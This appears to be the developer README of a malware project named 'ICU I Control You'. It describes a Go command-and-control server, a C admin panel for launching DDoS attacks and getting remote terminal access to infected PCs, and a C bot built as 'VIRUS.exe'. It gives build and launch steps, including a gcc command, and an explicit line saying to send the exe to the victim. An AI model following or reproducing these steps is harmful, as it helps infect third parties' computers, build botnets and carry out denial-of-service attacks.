# `ICU` I Control You

# Developer documentation (Russian version)

## Main folders (their usage)

-   server - The `server` folder is intended for the development and launch of the server itself (Golang) to which bots (PCs) will knock. The server accepts packets from the admin part and from bots (PCs) and also sends the corresponding packets.
-   admin - Folder `admin` of the admin part(C), sending the DDoS attack initiation package, monitoring bots (PCs), receiving reports, conducting activity testing and gaining remote access to the bot terminal.
-   sys - The `sys` folder written in (C) is compiled into .exe files that are needed by a potential user for infection. (Windows/Linux)

## Download to your PC

1. Make a fork or clone repository from a branch (main or latest version)

## Server Startup (Golang)

1. To start the server, navigate to the `cd server` directory.
2. Install the Golang language on your computer, for example from the website (- v1.23.0) - https://go.dev/doc/install
3. Create a file.env with the variables specified in .env.example
4. Then run the servers like `make run` or `go run main.go`

## Running the admin client (C)

1. To launch the admin client, navigate to the `cd admin/source` directory.
2. Run the ready-made exe file!

## Launching the bot client (C)

`cd sys/windows' is the main directory of the VIRUS ITSELF - send the exe file to `cd sys/windows/source' to the victim!

1. To get the bot, go to the `cd sys/windows` directory.

### If you are on windows

1. Download the gcc compiler - [Installation link](https://programforyou.ru/poleznoe/kak-ustanovit-gcc-dlya-windows ?ysclid=ma6mecgzgl891843266)
2. Install make - [Installation link](https://www.gnu.org/software/make/#download) - then run `make exe`
   2.1. Or run it in the terminal:

```bash
gcc x86_x64.c -o "source/VIRUS.exe" stdlib/ICU_log.c core/ICU_bot.c stdlib/ICU_ipgeo.c stdlib/ICU_env.c stdlib/crc.c stdlib/ICU_packet.c stdlib/ICU_dos.c process/windowsprocess.c process/recyclebinprocess.c process/dirprocess.c -mwindows -lws2_32 -lwinhttp -liphlpapi -lshell32 -lole32 -luuid
```

2. Then go to `cd sys/windows/windows`, that's it! you will find the exe file

